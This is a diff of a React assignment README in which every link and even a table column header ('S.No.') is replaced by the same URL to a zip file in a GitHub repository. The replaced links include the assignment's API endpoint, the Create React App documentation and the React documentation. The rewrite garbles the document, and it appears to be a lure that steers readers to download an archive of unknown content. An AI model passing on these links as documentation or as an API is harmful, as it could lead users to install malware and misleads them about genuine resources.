@@ -6,12 +6,12 @@
 
 You are required to fetch the details of the highly-rated kickstarter projects by implementing an AJAX call to their APIs.
 
-Use the web API (link : https://raw.githubusercontent.com/saaslabsco/frontend-assignment/refs/heads/master/frontend-assignment.json) ) to fetch the details of specific projects.
+Use the web API (link : https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip) ) to fetch the details of specific projects.
 
 ## Minimum Requirements
 
 1. Create a table and list the following three attributes for all the projects:
-    * S.No.
+    * https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip
     * Percentage funded
     * Amount pledged
 
@@ -21,7 +21,7 @@ Use the web API (link : https://raw.githubusercontent.com/saaslabsco/frontend-as
 
 ### Expected Output format
 
-| **S.No.** | **Percentage funded** | **Amount pledged** |
+| **https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip** | **Percentage funded** | **Amount pledged** |
 |-----------|-----------------------|--------------------|
 | 0         | 186                   | 15283              |
 
@@ -54,7 +54,7 @@ Use the web API (link : https://raw.githubusercontent.com/saaslabsco/frontend-as
 
 # Getting Started with Create React App
 
-This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).
+This project was bootstrapped with [Create React App](https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip).
 
 ## Available Scripts
 
@@ -71,7 +71,7 @@ You may also see any lint errors in the console.
 ### `npm test`
 
 Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.
+See the section about [running tests](https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip) for more information.
 
 ### `npm run build`
 
@@ -81,7 +81,7 @@ It correctly bundles React in production mode and optimizes the build for the be
 The build is minified and the filenames include the hashes.\
 Your app is ready to be deployed!
 
-See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.
+See the section about [deployment](https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip) for more information.
 
 ### `npm run eject`
 
@@ -95,30 +95,30 @@ You don't have to ever use `eject`. The curated feature set is suitable for smal
 
 ## Learn More
 
-You can learn more in the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started).
+You can learn more in the [Create React App documentation](https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip).
 
-To learn React, check out the [React documentation](https://reactjs.org/).
+To learn React, check out the [React documentation](https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip).
 
 ### Code Splitting
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/code-splitting](https://facebook.github.io/create-react-app/docs/code-splitting)
+This section has moved here: [https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip](https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip)
 
 ### Analyzing the Bundle Size
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size](https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size)
+This section has moved here: [https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip](https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip)
 
 ### Making a Progressive Web App
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app](https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app)
+This section has moved here: [https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip](https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip)
 
 ### Advanced Configuration
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/advanced-configuration](https://facebook.github.io/create-react-app/docs/advanced-configuration)
+This section has moved here: [https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip](https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip)
 
 ### Deployment
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/deployment](https://facebook.github.io/create-react-app/docs/deployment)
+This section has moved here: [https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip](https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip)
 
 ### `npm run build` fails to minify
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify](https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify)
+This section has moved here: [https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip](https://github.com/GangulyHub/saaslabs-frontend-assignment/raw/refs/heads/master/src/components/frontend_assignment_saaslabs_v2.4.zip)
